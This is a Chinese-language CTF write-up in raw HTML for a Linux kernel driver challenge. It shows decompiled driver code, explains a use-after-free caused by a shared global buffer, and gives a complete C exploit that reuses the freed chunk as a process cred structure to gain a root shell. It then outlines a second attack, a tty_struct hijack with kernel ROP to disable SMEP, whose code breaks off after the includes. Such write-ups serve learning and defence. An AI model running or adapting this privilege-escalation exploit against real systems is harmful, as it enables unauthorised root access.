class="brush:plain;toolbar:false">1.&nbsp;&nbsp;__int64&nbsp;__fastcall&nbsp;babyopen(inode&nbsp;*inode,&nbsp;file&nbsp;*filp,__int64&nbsp;a3,&nbsp;__int64&nbsp;a4)
+2.&nbsp;&nbsp;{
+3.&nbsp;&nbsp;char&nbsp;*v4;&nbsp;//&nbsp;rax@1
+4.&nbsp;&nbsp;__int64&nbsp;v5;&nbsp;//&nbsp;rdx@1
+5.&nbsp;
+6.&nbsp;&nbsp;_fentry__(inode,&nbsp;filp,&nbsp;a3,&nbsp;a4);
+7.&nbsp;&nbsp;LODWORD(v4)&nbsp;=&nbsp;kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches&nbsp;+&nbsp;6),&nbsp;&nbsp;0x24000C0LL,&nbsp;64LL);
+8.&nbsp;&nbsp;babydev_struct.device_buf&nbsp;=&nbsp;v4;
+9.&nbsp;&nbsp;babydev_struct.device_buf_len&nbsp;=&nbsp;64LL;
+10.&nbsp;printk(&quot;device&nbsp;open\n&quot;,&nbsp;0x24000C0LL,&nbsp;v5);
+11.&nbsp;return&nbsp;0LL;
+12.}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">close函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.__int64&nbsp;__fastcall&nbsp;babyopen(inode&nbsp;*inode,&nbsp;file&nbsp;*filp,&nbsp;__int64a3,&nbsp;__int64&nbsp;a4)
+2.&nbsp;&nbsp;{
+3.&nbsp;&nbsp;&nbsp;char&nbsp;*v4;&nbsp;//&nbsp;rax@1
+4.&nbsp;&nbsp;__int64&nbsp;v5;&nbsp;//&nbsp;rdx@1
+5.&nbsp;
+6.&nbsp;_fentry__(inode,&nbsp;filp,&nbsp;a3,&nbsp;a4);
+7.&nbsp;LODWORD(v4)&nbsp;=&nbsp;kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches&nbsp;+&nbsp;6),&nbsp;&nbsp;0x24000C0LL,&nbsp;64LL);
+8.&nbsp;babydev_struct.device_buf&nbsp;=&nbsp;v4;
+9.&nbsp;&nbsp;babydev_struct.device_buf_len&nbsp;=&nbsp;64LL;
+10.&nbsp;&nbsp;printk(&quot;device&nbsp;open\n&quot;,&nbsp;0x24000C0LL,&nbsp;v5);
+11.&nbsp;return&nbsp;0LL;
+12.}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">ioctl函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&nbsp;__int64&nbsp;__fastcall&nbsp;babyioctl(file&nbsp;*filp,&nbsp;__int64&nbsp;command,&nbsp;unsigned&nbsp;__int64&nbsp;arg,&nbsp;__int64&nbsp;a4)
+2.&nbsp;{
+3.&nbsp;size_t&nbsp;v4;&nbsp;//&nbsp;rdx@1
+4.&nbsp;size_t&nbsp;v5;&nbsp;//&nbsp;rbx@1
+5.&nbsp;char&nbsp;*v6;&nbsp;//&nbsp;rax@2
+6.&nbsp;__int64&nbsp;v7;&nbsp;//&nbsp;rdx@2
+7.&nbsp;__int64&nbsp;result;&nbsp;//&nbsp;rax@2
+8.&nbsp;
+9.&nbsp;_fentry__(filp,&nbsp;command,&nbsp;arg,&nbsp;a4);
+10.&nbsp;v5&nbsp;=&nbsp;v4;silu
+11.&nbsp;if&nbsp;(&nbsp;(_DWORD)command&nbsp;==&nbsp;0x10001&nbsp;)
+12.&nbsp;{
+13.&nbsp;kfree(babydev_struct.device_buf);
+14.&nbsp;LODWORD(v6)&nbsp;=&nbsp;_kmalloc(v5,&nbsp;0x24000C0LL);
+15.&nbsp;babydev_struct.device_buf&nbsp;=&nbsp;v6;
+16.&nbsp;babydev_struct.device_buf_len&nbsp;=&nbsp;v5;
+17.&nbsp;printk(&quot;alloc&nbsp;done\n&quot;,&nbsp;0x24000C0LL,&nbsp;v7);
+18.&nbsp;result&nbsp;=&nbsp;0LL;
+19.&nbsp;}
+20.&nbsp;else
+21.&nbsp;{
+22.&nbsp;printk(&amp;default_arg_is_format_str,&nbsp;v4,&nbsp;v4);
+23.&nbsp;result&nbsp;=&nbsp;-22LL;
+24.&nbsp;}
+25.&nbsp;return&nbsp;result;
+26.}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">write函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&nbsp;ssize_t&nbsp;__fastcall&nbsp;babywrite(file&nbsp;*filp,&nbsp;const&nbsp;char&nbsp;*buffer,&nbsp;size_t&nbsp;length,&nbsp;loff_t&nbsp;*offset)
+2.&nbsp;&nbsp;{
+3.&nbsp;unsigned&nbsp;__int64&nbsp;copy_len;&nbsp;//&nbsp;rdx@1
+4.&nbsp;ssize_t&nbsp;result;&nbsp;//&nbsp;rax@2
+5.&nbsp;ssize_t&nbsp;v6;&nbsp;//&nbsp;rbx@3
+6.&nbsp;
+7.&nbsp;_fentry__(filp,&nbsp;buffer,&nbsp;length,&nbsp;offset);
+8.&nbsp;if&nbsp;(&nbsp;babydev_struct.device_buf&nbsp;)
+9.&nbsp;{
+10.&nbsp;result&nbsp;=&nbsp;-2LL;
+11.&nbsp;if&nbsp;(&nbsp;babydev_struct.device_buf_len&nbsp;&gt;&nbsp;copy_len&nbsp;)
+12.&nbsp;{
+13.&nbsp;v6&nbsp;=&nbsp;copy_len;
+14.&nbsp;copy_from_user(babydev_struct.device_buf,&nbsp;buffer,&nbsp;copy_len);
+15.&nbsp;result&nbsp;=&nbsp;v6;
+16.&nbsp;}
+17.&nbsp;}
+18.&nbsp;else
+19.&nbsp;{
+20.&nbsp;result&nbsp;=&nbsp;-1LL;
+21.&nbsp;}
+22.&nbsp;return&nbsp;result;
+23.}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">read函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&nbsp;&nbsp;ssize_t&nbsp;__fastcall&nbsp;babyread(file&nbsp;*filp,&nbsp;char&nbsp;*buffer,&nbsp;size_t&nbsp;length,&nbsp;loff_t&nbsp;*offset)
+2.&nbsp;&nbsp;{
+3.&nbsp;unsigned&nbsp;__int64&nbsp;copy_len;&nbsp;//&nbsp;rdx@1
+4.&nbsp;ssize_t&nbsp;result;&nbsp;//&nbsp;rax@2
+5.&nbsp;ssize_t&nbsp;v6;&nbsp;//&nbsp;rbx@3
+6.&nbsp;
+7.&nbsp;_fentry__(filp,&nbsp;buffer,&nbsp;length,&nbsp;offset);
+8.&nbsp;if&nbsp;(&nbsp;babydev_struct.device_buf&nbsp;)
+9.&nbsp;{
+10.&nbsp;result&nbsp;=&nbsp;-2LL;
+11.&nbsp;if&nbsp;(&nbsp;babydev_struct.device_buf_len&nbsp;&gt;&nbsp;copy_len&nbsp;)
+12.&nbsp;{
+13.&nbsp;v6&nbsp;=&nbsp;copy_len;
+14.&nbsp;copy_to_user(buffer,&nbsp;babydev_struct.device_buf,&nbsp;copy_len);
+15.&nbsp;result&nbsp;=&nbsp;v6;
+16.&nbsp;}
+17.&nbsp;}
+18.&nbsp;else
+19.&nbsp;{
+20.&nbsp;result&nbsp;=&nbsp;-1LL;
+21.&nbsp;}
+22.&nbsp;return&nbsp;result;
+23.}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">源码非常简单，大概就是有一个struct，其中保存了一个buf和一个size，buf在open时通过kmem_cache_alloc进行分配，这个分配其实是和kmalloc一个原理，这里我是通过查看源码发现的，具体查看的源码如下：</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://elixir.free-electrons.com/linux/v4.12/source/include/linux/slab.h#L480">http://elixir.free-electrons.com/linux/v4.12/source/include/linux/slab.h#L480</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&nbsp;&nbsp;static&nbsp;__always_inline&nbsp;void&nbsp;*kmalloc(size_t&nbsp;size,&nbsp;gfp_t&nbsp;flags)
+2.&nbsp;&nbsp;{
+3.&nbsp;&nbsp;if&nbsp;(__builtin_constant_p(size))&nbsp;
+4.&nbsp;{
+5.&nbsp;if&nbsp;(size&nbsp;&gt;&nbsp;KMALLOC_MAX_CACHE_SIZE)
+6.&nbsp;return&nbsp;kmalloc_large(size,&nbsp;flags);
+7.&nbsp;&nbsp;#ifndef&nbsp;CONFIG_SLOB
+8.&nbsp;&nbsp;if&nbsp;(!(flags&nbsp;&amp;&nbsp;GFP_DMA))&nbsp;
+9.&nbsp;&nbsp;&nbsp;{
+10.&nbsp;int&nbsp;index&nbsp;=&nbsp;kmalloc_index(size);
+11.&nbsp;
+12.&nbsp;&nbsp;if&nbsp;(!index)
+13.&nbsp;return&nbsp;ZERO_SIZE_PTR;
+14.&nbsp;
+15.&nbsp;return&nbsp;kmem_cache_alloc_trace(kmalloc_caches[index],&nbsp;flags,&nbsp;size);
+16.&nbsp;}
+17.#endif
+18.&nbsp;}
+19.&nbsp;return&nbsp;__kmalloc(size,&nbsp;flags);
+20.}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">ifndef 是满足的，因为我们可以默认没有使用slob（猜的，因为大多数时候都是slub和slab，其中又以slub居多），所以return kmem_cache_alloc_trace其实就是open时候调用的，这里是因为常数时候编译器做了一个优化，所以看起来和kmalloc好像不太一样。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好了，open的时候kmalloc了一个大小为64的空间，然后size设置为64，release的时候将会释放这个空间。read和write都会先检查buf指针是不是为NULL，不为NULL再检查大小是否满足要求，之后进行read和write操作，也就是向用户空间写或者读。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ioctl比较特殊，首先判断command是不是为0x10001，如果满足，将会释放之前的buf，新分配一个用户决定大小的空间，并且设置为size。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">功能基本上就讲完了，乍一看好像没有漏洞，那是因为用户空间pwn的思维在限制你使用单线程的思维去考虑。如果是多线程呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们假设我们打开了两个设备文件，也就是调用了两次open，第一次分配了，第二次其实将会覆盖第一次分配的buf，因为是全局的。有了这个思维，剩下的就好想了，如果我们release了第一个，第二个其实就已经是被释放过的了，这样，就造成了一个UAF了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来我们就来讨论如何进行提权了，注意，题目是开启了SMEP保护的，从boot.sh中可以看出来。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.	题目思路1.0</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过我们对slub分配器的了解，相同大小的会被放在一块，现在我们来想想，一个进程的权限，是由什么定的？相信你们都知道，uid，uid又保存在哪儿呢？答案是cred结构。cred结构在每一个进程中都有一个，并且保存了该进程的权限信息，如果我们能够修改到cred信息，那么事情就很简单了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是思路是，我们有了一个UAF，使某个进程的cred结构体被放进这个UAF的空间，然后我们能够控制这个cred结构体，通过write写入uid，万事大吉！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">问题是，如何控制cred结构？别忘了，**相同大小的会被放在一块**，我们首先通过ioctl改变大小，使得和cred结构大小一样，接下来只需要在触发UAF的时候新建一个cred结构，新建的结构就很有可能被放进这个UAF的空间里，创建方法嘛，每一个进程都有，那么，新建一个进程不就好了？新建进程嘛，fork就解决了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好了，只剩下一个问题，大小是多少？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">方法一：查看源码。因为配置比较多，效率比较低，还容易错。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">方法二：编译一个带符号的内核，直接查看。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里怎么使用方法二就是另外一篇文章的内容了，大概就是编译一个源码，然后去看符号就行了。因为一般这种内核也就是默认编译，所以相对也会比较准确的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果查看源码，去掉debug选项，也可以计算出来，大小是0xa8。源码如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://elixir.free-electrons.com/linux/v4.4.72/source/include/linux/cred.h#L118">http://elixir.free-electrons.com/linux/v4.4.72/source/include/linux/cred.h#L118</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&nbsp;&nbsp;struct&nbsp;cred&nbsp;{
+2.&nbsp;&nbsp;atomic_t&nbsp;usage;
+3.&nbsp;&nbsp;#ifdef&nbsp;CONFIG_DEBUG_CREDENTIALS
+4.&nbsp;&nbsp;atomic_t&nbsp;subscribers;&nbsp;/*&nbsp;number&nbsp;of&nbsp;processes&nbsp;subscribed&nbsp;*/
+5.&nbsp;&nbsp;void&nbsp;*put_addr;
+6.&nbsp;&nbsp;unsigned&nbsp;magic;
+7.&nbsp;&nbsp;#define&nbsp;CRED_MAGIC&nbsp;0x43736564
+8.&nbsp;#define&nbsp;CRED_MAGIC_DEAD&nbsp;0x44656144
+9.&nbsp;#endif
+10.&nbsp;kuid_t&nbsp;uid;&nbsp;/*&nbsp;real&nbsp;UID&nbsp;of&nbsp;the&nbsp;task&nbsp;*/
+11.&nbsp;kgid_t&nbsp;gid;&nbsp;/*&nbsp;real&nbsp;GID&nbsp;of&nbsp;the&nbsp;task&nbsp;*/
+12.&nbsp;kuid_t&nbsp;suid;&nbsp;/*&nbsp;saved&nbsp;UID&nbsp;of&nbsp;the&nbsp;task&nbsp;*/
+13.&nbsp;kgid_t&nbsp;sgid;&nbsp;/*&nbsp;saved&nbsp;GID&nbsp;of&nbsp;the&nbsp;task&nbsp;*/
+14.&nbsp;kuid_t&nbsp;euid;&nbsp;/*&nbsp;effective&nbsp;UID&nbsp;of&nbsp;the&nbsp;task&nbsp;*/
+15.&nbsp;kgid_t&nbsp;egid;&nbsp;/*&nbsp;effective&nbsp;GID&nbsp;of&nbsp;the&nbsp;task&nbsp;*/
+16.&nbsp;kuid_t&nbsp;fsuid;&nbsp;/*&nbsp;UID&nbsp;for&nbsp;VFS&nbsp;ops&nbsp;*/
+17.&nbsp;kgid_t&nbsp;fsgid;&nbsp;/*&nbsp;GID&nbsp;for&nbsp;VFS&nbsp;ops&nbsp;*/
+18.&nbsp;unsigned&nbsp;securebits;&nbsp;/*&nbsp;SUID-less&nbsp;security&nbsp;management&nbsp;*/
+19.&nbsp;kernel_cap_t&nbsp;cap_inheritable;&nbsp;/*&nbsp;caps&nbsp;our&nbsp;children&nbsp;can&nbsp;inherit&nbsp;*/
+20.&nbsp;kernel_cap_t&nbsp;cap_permitted;&nbsp;/*&nbsp;caps&nbsp;we&#39;re&nbsp;permitted&nbsp;*/
+21.&nbsp;kernel_cap_t&nbsp;cap_effective;&nbsp;/*&nbsp;caps&nbsp;we&nbsp;can&nbsp;actually&nbsp;use&nbsp;*/
+22.&nbsp;kernel_cap_t&nbsp;cap_bset;&nbsp;/*&nbsp;capability&nbsp;bounding&nbsp;set&nbsp;*/
+23.&nbsp;kernel_cap_t&nbsp;cap_ambient;&nbsp;/*&nbsp;Ambient&nbsp;capability&nbsp;set&nbsp;*/
+24.#ifdef&nbsp;CONFIG_KEYS
+25.&nbsp;unsigned&nbsp;char&nbsp;jit_keyring;&nbsp;/*&nbsp;default&nbsp;keyring&nbsp;to&nbsp;attach&nbsp;requested&nbsp;keys&nbsp;to&nbsp;*/
+26.&nbsp;struct&nbsp;key&nbsp;__rcu&nbsp;*session_keyring;&nbsp;/*&nbsp;keyring&nbsp;inherited&nbsp;over&nbsp;fork&nbsp;*/
+27.&nbsp;struct&nbsp;key&nbsp;*process_keyring;&nbsp;/*&nbsp;keyring&nbsp;private&nbsp;to&nbsp;this&nbsp;process&nbsp;*/
+28.&nbsp;struct&nbsp;key&nbsp;*thread_keyring;&nbsp;/*&nbsp;keyring&nbsp;private&nbsp;to&nbsp;this&nbsp;thread&nbsp;*/
+29.&nbsp;struct&nbsp;key&nbsp;*request_key_auth;&nbsp;/*&nbsp;assumed&nbsp;request_key&nbsp;authority&nbsp;*/
+30.#endif
+31.#ifdef&nbsp;CONFIG_SECURITY
+32.&nbsp;void&nbsp;*security;&nbsp;/*&nbsp;subjective&nbsp;LSM&nbsp;security&nbsp;*/
+33.#endif
+34.&nbsp;struct&nbsp;user_struct&nbsp;*user;&nbsp;/*&nbsp;real&nbsp;user&nbsp;ID&nbsp;subscription&nbsp;*/
+35.&nbsp;struct&nbsp;user_namespace&nbsp;*user_ns;&nbsp;/*&nbsp;user_ns&nbsp;the&nbsp;caps&nbsp;and&nbsp;keyrings&nbsp;are&nbsp;relative&nbsp;to.&nbsp;*/
+36.&nbsp;struct&nbsp;group_info&nbsp;*group_info;&nbsp;/*&nbsp;supplementary&nbsp;groups&nbsp;for&nbsp;euid/fsgid&nbsp;*/
+37.&nbsp;struct&nbsp;rcu_head&nbsp;rcu;&nbsp;/*&nbsp;RCU&nbsp;deletion&nbsp;hook&nbsp;*/
+38.};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于不是很明确的type可以直接查找reference去查看typedef。同时通过查看源码，我们还轻松的找到了uid等等各种id的位置。那么直接把该改的都改为0就可以了</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">方法就很简单了，看看exp吧。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&nbsp;&nbsp;#include&nbsp;&lt;stdio.h&gt;
+2.&nbsp;&nbsp;#include&nbsp;&lt;unistd.h&gt;
+3.&nbsp;&nbsp;#include&nbsp;&lt;stdlib.h&gt;
+4.&nbsp;&nbsp;#include&nbsp;&lt;fcntl.h&gt;
+5.&nbsp;&nbsp;#include&nbsp;&lt;string.h&gt;
+6.&nbsp;&nbsp;#include&nbsp;&lt;sys/types.h&gt;
+7.&nbsp;&nbsp;#include&nbsp;&lt;sys/wait.h&gt;
+8.&nbsp;&nbsp;#include&nbsp;&lt;sys/ioctl.h&gt;
+9.&nbsp;&nbsp;#include&nbsp;&lt;pthread.h&gt;
+10.#define&nbsp;CRED_SIZE&nbsp;168
+11.#define&nbsp;DEV_NAME&nbsp;&quot;/dev/babydev&quot;
+12.char&nbsp;buf[100];
+13.int&nbsp;main()&nbsp;
+14.{
+15.&nbsp;int&nbsp;fd1,&nbsp;fd2,&nbsp;ret;
+16.&nbsp;char&nbsp;zero_buf[100];
+17.&nbsp;memset(zero_buf,&nbsp;0,&nbsp;sizeof(char)&nbsp;*&nbsp;100);
+18.&nbsp;fd1&nbsp;=&nbsp;open(DEV_NAME,&nbsp;O_RDWR);
+19.&nbsp;fd2&nbsp;=&nbsp;open(DEV_NAME,&nbsp;O_RDWR);
+20.&nbsp;
+21.&nbsp;ret&nbsp;=&nbsp;ioctl(fd1,&nbsp;0x10001,&nbsp;CRED_SIZE);
+22.&nbsp;
+23.&nbsp;close(fd1);
+24.&nbsp;
+25.&nbsp;int&nbsp;now_uid&nbsp;=&nbsp;1000;//当前uid为1000
+26.&nbsp;int&nbsp;pid&nbsp;=&nbsp;fork();
+27.&nbsp;if&nbsp;(pid&nbsp;&lt;&nbsp;0)
+28.&nbsp;{
+29.&nbsp;perror(&quot;fork&nbsp;error&quot;);
+30.&nbsp;return&nbsp;0;
+31.&nbsp;}
+32.&nbsp;
+33.&nbsp;if&nbsp;(!pid)&nbsp;
+34.&nbsp;{
+35.&nbsp;//写入28个0，一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了。
+36.&nbsp;ret&nbsp;=&nbsp;write(fd2,&nbsp;zero_buf,&nbsp;28);
+37.&nbsp;now_uid&nbsp;=&nbsp;getuid();
+38.&nbsp;if&nbsp;(!now_uid)&nbsp;
+39.&nbsp;{
+40.&nbsp;printf(&quot;get&nbsp;root&nbsp;done\n&quot;);
+41.&nbsp;//&nbsp;权限修改完毕，启动一个shell，就是root的shell了。
+42.&nbsp;system(&quot;/bin/sh&quot;);
+43.&nbsp;exit(0);
+44.&nbsp;}
+45.&nbsp;else
+46.&nbsp;{
+47.&nbsp;puts(&quot;failed?&quot;);
+48.&nbsp;exit(0);
+49.&nbsp;}
+50.&nbsp;}
+51.&nbsp;else
+52.&nbsp;{
+53.&nbsp;wait(NULL);
+54.&nbsp;}
+55.&nbsp;close(fd2);
+56.&nbsp;return&nbsp;0;
+57.}</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.	题目思路2.0</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好了，第一种方法只是个开胃菜，非常简单非常粗暴，现在让我们来看看更麻烦的方法，使用tty_struct。关于tty的知识我在这里不想做过多解释，大家可以自行查找资料。反正tty也是一种设备，通过&#39;/dev/ptmx&#39;可以打开这个设备，我们要做的，就是去修改这个设备的函数指针，从而使得对这个设备的操作变为我们所能控制的，也就是说，我们控制了内核空间的执行流，完美！那么又该干点什么呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于开启了smep，我们不能直接返回用户空间然后以ring0的身份调用函数。如果可以，那么只需要调用commit_creds(prepare_kernel_cred(NULL))就可以设置为root身份，可惜我们还有更多的工作要做。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">既然问题是开启了smep，那么简单，我们反正都控制了执行流，把它关掉就好了。关掉的方法就是通过写入cr4寄存器，将smep位关掉就好了，关掉smep，我们就可以回去执行提权的函数啦。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可是光是控制一次执行流是没办法做这么多工作的，而且我们也没法执行用户空间指定的代码，方法嘛，也是我们常见的方法，ROP。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过在内核空间进行ROP，执行内核代码，关掉smep，之后回用户空间提权，然后就可以打开shell啦。内核的ROP其实和用户空间ROP相差无几，不过还是有几个细节内容需要考虑，比如，栈在哪儿？没有栈咋ROP呢？没有栈，我们就自己造栈嘛，通过一个gadget，比如xchg eax, esp，注意这里是eax和esp，32位的，就可以做到了。原理就是由于在执行那个ioctl的时候eax正好是要执行的指令的地址，换句话说，就是gadget的地址，而eax截取了低32位，如果是整个64位，rax必然是一个内核空间的地址，可是低32位，就落到用户空间了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是我们mmap这个位置，xchg eax, esp，使得esp变为这个值，这样栈就落到了用户空间以内。虽然没法执行代码，但是可以获取数据啊，于是我们就从用户空间获取数据来ret，然后执行内核空间的代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好了，几个难点如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)	如何获取控制流？已解决，通过UAF使得tty_struct覆盖我们释放的位置，我们可以控制tty_struct，然后改写它的操作即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)	如何设定栈？已解决，xchg eax, esp。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3)	如何关掉smep？已解决，通过ROP调用内核空间的gadget写入关掉smep的新cr4值到cr4寄存器里。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4)	如何获取权限？已解决，在关掉smep之后，用户空间调用commit_creds(prepare_kernel_creds(0))即可，这两个函数都是位于内核空间的，可是只要我们知道他们的符号位置，就可以调用内核函数，因为回到用户空间之后，我们的特权还是ring 0的，只是内存位置回来了而已。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5)	如何获取shell？还需要解决？直接system(&quot;/bin/sh&quot;);不就完了，用户空间的代码可是我们自己写的啊！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6)	实际问题：如何写ROP链？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">剩下一个实际问题需要我们解决了，主要是，怎么找gadget？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">bzImage实际上是已经被压缩过得vmlinuz，我们需要通过linux源码里scripts目录下的extract-vmlinux来extract，之后直接通过ropper或者ROPGadgets获取gadget就可以了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来就是要找哪些gadget的问题了，根据之前的问题，我们需要如下的gadget：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)	xchg eax, esp来设置栈，用这个gadget覆盖ioctl操作函数嘛。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)	写入cr4，来关闭smep。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3)	swapgs，回到用户空间之前的准备。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4)	iretq，用来回到用户空间特权级方便打开shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5)	commit_creds</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6)	prepare_kernel_cred</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">7)	打开shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前四个直接在刚才生成的gadget中去找就可以了，后三个中的4和5，需要内核符号，在/proc/kallsyms文件可以读取到内核所有符号的地址，所以解决了，最后一个打开shell，就是用户空间的地址，好了，解决完毕。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是任务就简单了，让我们来看看exp：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&nbsp;&nbsp;#include&nbsp;&lt;stdio.h&gt;
+2.&nbsp;&nbsp;#include&nbsp;&lt;stdlib.h&gt;
+3.&nbsp;&nbsp;#include&nbsp;&lt;unistd.h&gt;
+4.&nbsp;&nbsp;#include&nbsp;&lt;sys/types.h&gt;
+5.&nbsp;&nbsp;#include&nbsp;&lt;errno.h&gt;
+6.&nbsp;&nbsp;#include&nbsp;&lt;sys/stat.h&gt;
+7.&nbsp;&nbsp;#include&nbsp;&lt;sys/ioctl.h&gt;
+8.&nbsp;&nbsp;#include&nbsp;&lt;fcntl.h&gt;
+9.&nbsp;&nbsp;#include&nbsp;&lt;string.h&gt;
+10.#include&nbsp;&lt;pty.h&gt;
+11.#include&nbsp;&lt;sys/mman.h&gt;
+12.#include&nbsp;&lt;sys/ipc.h&gt;
+13.#include&nbsp;&lt;sys/sem.h&gt;
+14.
